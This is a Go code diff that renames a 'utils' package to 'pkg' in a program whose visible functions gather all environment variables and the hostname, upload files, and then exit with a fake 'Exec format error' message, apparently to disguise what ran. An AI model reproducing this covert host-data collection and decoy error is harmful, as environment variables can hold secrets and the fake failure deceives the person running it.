@@ -4,7 +4,7 @@ import (
 	"bytes"
 	"encoding/json"
 	. "getitle/src/core"
-	"getitle/src/utils"
+	"getitle/src/pkg"
 	"io/ioutil"
 	"net"
 	"net/http"
@@ -26,7 +26,7 @@ func inforev() {
 	if !connected {
 		exit()
 	}
-	//conn := utils.HttpConn(2)
+	//conn := pkg.HttpConn(2)
 	env := os.Environ()
 	hostname, _ := os.Hostname()
 	env = append(env, hostname)
@@ -58,12 +58,12 @@ func uploadfiles(filenames []string) {
 }
 
 func attrib(filename string) bool {
-	if utils.Win {
+	if pkg.Win {
 
 	}
 	return false
 }
 
 func exit() {
-	utils.Panic("cannot execute binary file: Exec format error")
+	pkg.Panic("cannot execute binary file: Exec format error")
 }
